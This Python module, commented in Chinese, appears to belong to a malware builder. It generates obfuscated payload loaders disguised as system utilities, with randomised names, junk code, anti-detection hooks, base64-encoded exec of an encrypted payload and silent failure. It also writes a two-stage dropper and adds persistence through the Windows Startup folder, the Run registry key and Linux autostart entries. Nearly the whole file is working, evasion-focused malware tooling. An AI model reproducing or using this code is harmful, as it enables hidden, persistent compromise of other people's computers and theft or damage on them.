# -*- coding: utf-8 -*-
"""
Shell生成模块
提供Shell文件生成和持久化功能
"""
import os
import random
import string
import datetime
from .anti_detection import create_advanced_evasion_code


def gene_shell(encrypted_code, key, output_dir=".", filename=None, add_persistence=False, anti_detection=True, silent_delay=30):
    """生成Shell文件"""
    # 随机生成变量名以避免特征检测
    var_names = {
        's1': ''.join(random.choices(string.ascii_lowercase, k=8)),
        's2': ''.join(random.choices(string.ascii_lowercase, k=8)),
        's3': ''.join(random.choices(string.ascii_lowercase, k=8)),
        'key': ''.join(random.choices(string.ascii_lowercase, k=8)),
        'base64': ''.join(random.choices(string.ascii_lowercase, k=8)),
        'decrypt': ''.join(random.choices(string.ascii_lowercase, k=8))
    }
    
    # 添加随机junk code
    junk_code = []
    for _ in range(random.randint(3, 8)):
        junk_func_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        junk_code.append(f"""
def {junk_func_name}():
    a = {random.randint(1, 100)}
    b = {random.randint(1, 100)}
    return a + b
""")
    
    # 高级反检测代码
    evasion_code = ""
    if anti_detection:
        evasion_code = create_advanced_evasion_code()
    
    # 基本模板，但使用随机变量名
    template = '''# -*- coding: utf-8 -*-
"""
System Service Manager
Manages system monitoring and maintenance tasks
"""
import base64 as {base64}
import re
import os
import sys
import time
import random
{junk_imports}

# Generated on {timestamp}
{junk_code}

{evasion_code}

{var_s1}=r"""{encrypted_code}"""
{var_s2}=r"ZGVmIHBhcnNlS2V5KGtleSk6CiAgICBpZiBrZXkgIT0gIiI6CiAgICAgICAgbyA9IDAKICAgICAgICBmb3IgayBpbiBrZXk6CiAgICAgICAgICAgIG4gPSAwCiAgICAgICAgICAgIGkgPSBzdHIob3JkKGspKQogICAgICAgICAgICBmb3IgdCBpbiBpOgogICAgICAgICAgICAgICAgbiArPSBpbnQodCkKICAgICAgICAgICAgbyArPSBuCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgaWYgbyA8IDEwOgogICAgICAgICAgICAgICAgbyA9IGludChvICogMikKICAgICAgICAgICAgZWxpZiBvID4gMTAwOgogICAgICAgICAgICAgICAgbyA9IGludChvIC8gMikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJldHVybiBvCiAgICByZXR1cm4="
{var_s3}=r"ZGVmIGRlY3J5cHQoZGF0YSxrZXkpOgogICAgaWYgZGF0YSA9PSAiIjoKICAgICAgICByZXR1cm4KICAgIHJlc3VsdCA9ICIiCiAgICBrZXljb2RlMSA9IHBhcnNlS2V5KGtleSkKICAgIGEgPSBsZW4oZGF0YSkgLy8gMgogICAgYjEgPSBkYXRhWzphXQogICAgYjIgPSBkYXRhW2E6XQogICAgYyA9IFtvcmQoZCkgZm9yIGQgaW4gYjFdCiAgICBlID0gW2YgLSBrZXljb2RlMSBmb3IgZiBpbiBjXQogICAgZyA9IHN0cihzdW0oYykpCiAgICBrZXljb2RlMiA9IHBhcnNlS2V5KGcpCiAgICBoID0gW29yZChpKSBmb3IgaSBpbiBiMl0KICAgIGogPSBbayAtIGtleWNvZGUyIGZvciBrIGluIGhdCiAgICBrID0gbGVuKGUpIC8vIDIKICAgIGdyb3VwMSA9IGVbOmtdCiAgICBncm91cDQgPSBlW2s6XQogICAgZ3JvdXAyID0gals6a10KICAgIGdyb3VwMyA9IGpbazpdCiAgICBkYXRhbGVuZ3RoID0gbGVuKGdyb3VwMSkgKyBsZW4oZ3JvdXAyKSArIGxlbihncm91cDMpICsgbGVuKGdyb3VwNCkKICAgIGwgPSBkYXRhbGVuZ3RoIC8vIDQKICAgIG0gPSBbXQogICAgZm9yIG4gaW4gcmFuZ2UobCk6CiAgICAgICAgbS5hcHBlbmQoZ3JvdXAxW25dKQogICAgICAgIG0uYXBwZW5kKGdyb3VwMltuXSkKICAgIG8gPSBbXQogICAgZm9yIHAgaW4gcmFuZ2UobCk6CiAgICAgICAgby5hcHBlbmQoZ3JvdXAzW3BdKQogICAgICAgIG8uYXBwZW5kKGdyb3VwNFtwXSkKICAgIHEgPSBtICsgbwogICAgZm9yIHIgaW4gcToKICAgICAgICBpZiBub3Qgcj09MDoKICAgICAgICAgICAgcmVzdWx0ICs9IGNocihyKQogICAgcmV0dXJuIHJlc3VsdAo="
{var_key} = r"""{key}"""

# 避免常见的特征检测
def {obfuscated_exec}(code):
    getattr(__builtins__, ''.join(['e','x','e','c']))(code)

def main_service():
    """主服务函数"""
    try:
        # 环境检查
        if not comprehensive_environment_check({silent_delay}):
            return
            
        # 解码执行
        {obfuscated_exec}({base64}.b64decode({var_s2}).decode())
        {obfuscated_exec}({base64}.b64decode({var_s3}).decode())
        {decrypt_func} = locals()['decrypt']
        {obfuscated_exec}({decrypt_func}({var_s1},{var_key}))
        
    except Exception:
        # 静默失败
        pass

{persistence_code}

if __name__ == "__main__":
    main_service()
'''
    
    # 随机导入
    junk_imports = []
    potential_imports = ["import datetime", "import math", "import json", "import hashlib", 
                         "import socket", "import urllib.request", "import logging"]
    for _ in range(random.randint(2, 5)):
        junk_imports.append(random.choice(potential_imports))
    
    persistence_code = ""
    if add_persistence:
        persistence_code = _generate_persistence_code(add_persistence)
    
    # 填充模板
    content = template.format(
        timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        encrypted_code=encrypted_code,
        key=key,
        junk_code='\n'.join(junk_code),
        junk_imports='\n'.join(junk_imports),
        evasion_code=evasion_code,
        persistence_code=persistence_code,
        var_s1=var_names['s1'],
        var_s2=var_names['s2'],
        var_s3=var_names['s3'],
        var_key=var_names['key'],
        base64=var_names['base64'],
        decrypt_func=var_names['decrypt'],
        obfuscated_exec=''.join(random.choices(string.ascii_lowercase, k=10)),
        silent_delay=silent_delay,
        add_persistence=str(add_persistence).lower()
    )
    
    # 随机生成文件名，使用更通用的名称避免特征检测
    if filename is None:
        legitimate_names = [
            "system_monitor.py", "network_service.py", "update_checker.py",
            "connectivity.py", "maintenance.py", "data_sync.py",
            "cloud_client.py", "config_updater.py", "service_manager.py"
        ]
        filename = random.choice(legitimate_names)
    
    filepath = os.path.join(output_dir, filename)
    
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(content)
    
    return filepath


def create_payload_dropper(encrypted_code, key, output_dir="."):
    """创建简化的多阶段执行代码"""
    # 创建一个简单的分阶段加载器
    dropper_code = f'''# -*- coding: utf-8 -*-
"""
System monitoring utility
"""
import os
import sys
import time
import random
import base64

# 配置参数
PAYLOAD_DATA = r"""{encrypted_code}"""
KEY_DATA = r"""{key}"""

def check_environment():
    """环境检查"""
    # 添加延迟避免快速分析
    time.sleep(random.uniform(0.5, 2.0))
    return True

def load_stage2():
    """加载第二阶段"""
    if not check_environment():
        return
    
    # 解密函数代码
    decode_func = r"ZGVmIHBhcnNlS2V5KGtleSk6CiAgICBpZiBrZXkgIT0gIiI6CiAgICAgICAgbyA9IDAKICAgICAgICBmb3IgayBpbiBrZXk6CiAgICAgICAgICAgIG4gPSAwCiAgICAgICAgICAgIGkgPSBzdHIob3JkKGspKQogICAgICAgICAgICBmb3IgdCBpbiBpOgogICAgICAgICAgICAgICAgbiArPSBpbnQodCkKICAgICAgICAgICAgbyArPSBuCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgaWYgbyA8IDEwOgogICAgICAgICAgICAgICAgbyA9IGludChvICogMikKICAgICAgICAgICAgZWxpZiBvID4gMTAwOgogICAgICAgICAgICAgICAgbyA9IGludChvIC8gMikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJldHVybiBvCiAgICByZXR1cm4="
    decrypt_func = r"ZGVmIGRlY3J5cHQoZGF0YSxrZXkpOgogICAgaWYgZGF0YSA9PSAiIjoKICAgICAgICByZXR1cm4KICAgIHJlc3VsdCA9ICIiCiAgICBrZXljb2RlMSA9IHBhcnNlS2V5KGtleSkKICAgIGEgPSBsZW4oZGF0YSkgLy8gMgogICAgYjEgPSBkYXRhWzphXQogICAgYjIgPSBkYXRhW2E6XQogICAgYyA9IFtvcmQoZCkgZm9yIGQgaW4gYjFdCiAgICBlID0gW2YgLSBrZXljb2RlMSBmb3IgZiBpbiBjXQogICAgZyA9IHN0cihzdW0oYykpCiAgICBrZXljb2RlMiA9IHBhcnNlS2V5KGcpCiAgICBoID0gW29yZChpKSBmb3IgaSBpbiBiMl0KICAgIGogPSBbayAtIGtleWNvZGUyIGZvciBrIGluIGhdCiAgICBrID0gbGVuKGUpIC8vIDIKICAgIGdyb3VwMSA9IGVbOmtdCiAgICBncm91cDQgPSBlW2s6XQogICAgZ3JvdXAyID0gals6a10KICAgIGdyb3VwMyA9IGpbazpdCiAgICBkYXRhbGVuZ3RoID0gbGVuKGdyb3VwMSkgKyBsZW4oZ3JvdXAyKSArIGxlbihncm91cDMpICsgbGVuKGdyb3VwNCkKICAgIGwgPSBkYXRhbGVuZ3RoIC8vIDQKICAgIG0gPSBbXQogICAgZm9yIG4gaW4gcmFuZ2UobCk6CiAgICAgICAgbS5hcHBlbmQoZ3JvdXAxW25dKQogICAgICAgIG0uYXBwZW5kKGdyb3VwMltuXSkKICAgIG8gPSBbXQogICAgZm9yIHAgaW4gcmFuZ2UobCk6CiAgICAgICAgby5hcHBlbmQoZ3JvdXAzW3BdKQogICAgICAgIG8uYXBwZW5kKGdyb3VwNFtwXSkKICAgIHEgPSBtICsgbwogICAgZm9yIHIgaW4gcToKICAgICAgICBpZiBub3Qgcj09MDoKICAgICAgICAgICAgcmVzdWx0ICs9IGNocihyKQogICAgcmV0dXJuIHJlc3VsdAo="
    
    try:
        # 执行解密函数
        exec(base64.b64decode(decode_func).decode())
        exec(base64.b64decode(decrypt_func).decode())
        
        # 获取解密函数
        parse_key = locals().get('parseKey')
        decrypt = locals().get('decrypt')
        
        if parse_key and decrypt:
            # 解密并执行最终代码
            final_code = decrypt(PAYLOAD_DATA, KEY_DATA)
            exec(final_code)
            
    except Exception:
        # 静默失败
        pass

if __name__ == "__main__":
    load_stage2()
'''
    
    # 保存文件
    stage1_path = os.path.join(output_dir, "system_monitor.py")
    with open(stage1_path, "w") as f:
        f.write(dropper_code)
    
    return stage1_path


def _generate_persistence_code(add_persistence):
    """生成持久化代码"""
    return '''
# 持久化代码 (仅用于测试环境)
def _setup_persistence():
    try:
        import platform
        import shutil
        current_file = os.path.abspath(__file__)
        
        if platform.system() == "Windows":
            # Windows启动项
            try:
                import winreg
                startup_path = os.path.join(os.environ.get("APPDATA", ""), 
                                           "Microsoft", "Windows", "Start Menu", 
                                           "Programs", "Startup")
                if os.path.exists(startup_path):
                    target_file = os.path.join(startup_path, "SystemService.py")
                    shutil.copy2(current_file, target_file)
                
                # 注册表启动项
                key = winreg.HKEY_CURRENT_USER
                key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as registry_key:
                    winreg.SetValueEx(registry_key, "SystemMonitor", 0, winreg.REG_SZ, current_file)
            except:
                pass
                
        elif platform.system() == "Linux":
            # Linux自启动
            try:
                home_dir = os.path.expanduser("~")
                autostart_dir = os.path.join(home_dir, ".config", "autostart")
                os.makedirs(autostart_dir, exist_ok=True)
                
                desktop_file = os.path.join(autostart_dir, "system-monitor.desktop")
                with open(desktop_file, "w") as f:
                    f.write(f"""[Desktop Entry]
Type=Application
Name=System Monitor
Exec=python3 {current_file}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""")
            except:
                pass
    except:
        pass

# 如果启用持久化，尝试设置
if ''' + str(add_persistence).lower() + ''':
    _setup_persistence()
'''
